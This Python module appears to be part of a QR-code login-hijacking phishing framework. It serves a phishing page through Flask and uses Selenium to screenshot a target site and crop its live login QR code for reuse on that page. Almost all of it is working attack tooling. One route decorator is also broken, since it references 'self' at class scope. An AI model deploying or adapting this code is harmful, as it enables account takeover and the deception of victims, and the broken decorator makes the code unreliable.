#!/usr/bin/python3.7
import os, random, socketserver, http.server, _thread as thread
from flask import Flask, render_template_string, send_from_directory
from threading import Thread
from werkzeug.serving import make_server
from jinja2 import Environment, PackageLoader, FileSystemLoader
from binascii import a2b_base64
from PIL import Image
from . import Settings
from selenium.webdriver.common.by import By
import logging

class Server:
    def __init__(self, template_name="phishing_page.html", *args, **kwargs):
        self.templates_dir = os.path.join(Settings.path,"core","templates")
        with open(os.path.join(self.templates_dir, template_name), 'r') as f:
            self.template_str = f.read()
        self.template_args = args
        self.template_kwargs = kwargs
        self.name = kwargs["name"]
        self.port = kwargs["port"]
        self.app = Flask(__name__, static_folder=os.path.join(Settings.path, "core", "www", self.name))
        self.srv = None
        self.thread = None
        self.app.route('/')(self.serve)
        self.app.route('/<path:filename>')(self.send_file)

        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

    def serve(self):
        return render_template_string(self.template_str, *self.template_args, **self.template_kwargs)

    def send_file(self, filename):
        return send_from_directory(self.app.static_folder, filename)

    def start_serving(self, host="0.0.0.0"):
        self.srv = make_server(host, self.port, self.app)
        self.thread = Thread(target=self.srv.serve_forever)
        self.thread.start()

    @self.app.route('/stop-web-server', methods=['GET'])
    def stop_web_server(self):
        if self.srv is not None:
            self.srv.shutdown()
        return 'Web server stopped', 200


class misc:
    def Screenshot( browser, img_xpath, name): # PicName, location, size):
        # Take a screenshot to the page then cut the QR image
        img_path  = os.path.join(Settings.path, "core", "www", name, "full.png")
        imgObject = browser.find_element(By.XPATH, img_xpath)      # Getting the image element
        browser.save_screenshot(img_path)                           # Taking screenshot to the whole page
        img = Image.open(img_path)
        left,top = imgObject.location['x'],imgObject.location['y']  # Getting the image exact location (1)
        right = left + imgObject.size['width']                      # (2)
        bottom = top + imgObject.size['height']                     # (3)
        box = (int(left), int(top), int(right), int(bottom))        # Defines crop points
        final = img.crop(box)                                       # Croping the specific part we need to crop
        final.load()
        final.save(img_path.replace("full","tmp"))                  # Overwritting the full screenshot image with the cropped one

    def base64_to_image( base64_data):
        # Becomes useful if the targeted website is loading the image from a base64 string
        return a2b_base64( base64_data.replace("data:image/png;base64,","") )

    def gen_random():
        # Generate a random number to use in file naming
        return str( random.randint(1,100)+random.randint(1,1000) )

# Options format: [Required or not, option_description, default_value]
# Required     --> 1 # Means that it must have value
# Not required --> 0 # Means that it could have value or not
class types:
    class grabber:
        options = {
            "port":[1,"The local port to listen on.",80],
            "host":[1,"The local host to listen on.","0.0.0.0"],
            "useragent":[1,"Make useragent is the (default) one, a (random) generated useragent or a specifed useragent","(default)"]
        }

    class post:
        options = {
            "session_id":[1,"Session id to run the module on",""]
        }
